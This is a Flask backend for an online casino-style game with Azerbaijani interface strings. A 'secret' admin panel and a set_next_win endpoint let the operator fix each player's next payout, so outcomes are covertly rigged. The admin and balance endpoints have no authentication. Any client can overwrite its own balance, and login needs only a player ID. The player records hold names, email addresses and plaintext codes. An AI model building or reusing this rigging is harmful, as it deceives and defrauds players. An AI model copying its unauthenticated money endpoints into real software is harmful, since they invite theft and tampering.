import os
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Oyunçu bazası
players_db = {
    "HOT_1106": {
        "id": "HOT_1106",
        "name": "Alexs Aliyev",
        "email": "aliyevalexs23@gmail.com",
        "code": "PASS483",
        "status": "Onlayn (Aktiv)",
        "last_seen": "15:00:12",
        "balance": 160.39,
        "total_deposit": 250.00,
        "next_win": None
    },
    "HOT_9446": {
        "id": "HOT_9446",
        "name": "Alexs",
        "email": "aliyev@gmail.com",
        "code": "PASS379",
        "status": "Oflayn",
        "last_seen": "14:31:17",
        "balance": 2.85,
        "total_deposit": 50.00,
        "next_win": None
    }
}

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/admin')
def admin_panel():
    return render_template('gizli_panel.html', players=players_db.values())

@app.route('/api/set_next_win', methods=['POST'])
def set_next_win():
    data = request.json
    player_id = data.get('player_id')
    forced_win = data.get('next_win')
    
    if player_id in players_db:
        try:
            if forced_win == "" or forced_win is None:
                players_db[player_id]['next_win'] = None
            else:
                players_db[player_id]['next_win'] = float(forced_win)
            return jsonify({"success": True, "message": "Uğurla təyin edildi!"})
        except ValueError:
            return jsonify({"success": False, "message": "Yanlış məbləğ formatı!"}), 400
            
    return jsonify({"success": False, "message": "Oyunçu tapılmadı!"}), 404

@app.route('/api/add_balance', methods=['POST'])
def add_balance():
    data = request.json
    player_id = data.get('player_id')
    amount = data.get('amount')
    
    if player_id in players_db:
        try:
            val = float(amount)
            players_db[player_id]['balance'] += val
            return jsonify({"success": True, "message": f"Balansa {val:.2f} ₼ əlavə edildi!"})
        except ValueError:
            return jsonify({"success": False, "message": "Yanlış məbləğ!"}), 400
            
    return jsonify({"success": False, "message": "Oyunçu tapılmadı!"}), 404

@app.route('/check_forced_win', methods=['POST'])
def check_forced_win():
    data = request.json
    player_id = data.get('player_id')
    
    if player_id in players_db:
        win_val = players_db[player_id]['next_win']
        players_db[player_id]['next_win'] = None  # Verildikdən sonra sıfırlanır
        return jsonify({"forcedWin": win_val if win_val is not None else 0})
        
    return jsonify({"forcedWin": 0})

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    player_id = data.get('playerId')
    if player_id in players_db:
        return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})
    return jsonify({"status": "error", "message": "Tapılmadı"})

@app.route('/auth', methods=['POST'])
def auth():
    data = request.json
    name = data.get('name')
    email = data.get('gmail')
    new_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
    players_db[new_id] = {
        "id": new_id, "name": name, "email": email, "code": "PASS123",
        "status": "Onlayn", "last_seen": "İndi", "balance": 10.00, "total_deposit": 10.00, "next_win": None
    }
    return jsonify({"status": "success", "playerId": new_id, "balance": 10.00})

@app.route('/update_balance', methods=['POST'])
def update_balance():
    data = request.json
    player_id = data.get('playerId')
    new_balance = data.get('balance')
    if player_id in players_db and new_balance is not None:
        players_db[player_id]['balance'] = float(new_balance)
        return jsonify({"status": "success"})
    return jsonify({"status": "error"})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    player_id = data.get('playerId')
    amount = data.get('amount')
    if player_id in players_db and players_db[player_id]['balance'] >= amount:
        players_db[player_id]['balance'] -= amount
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Balans kifayət etmir"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)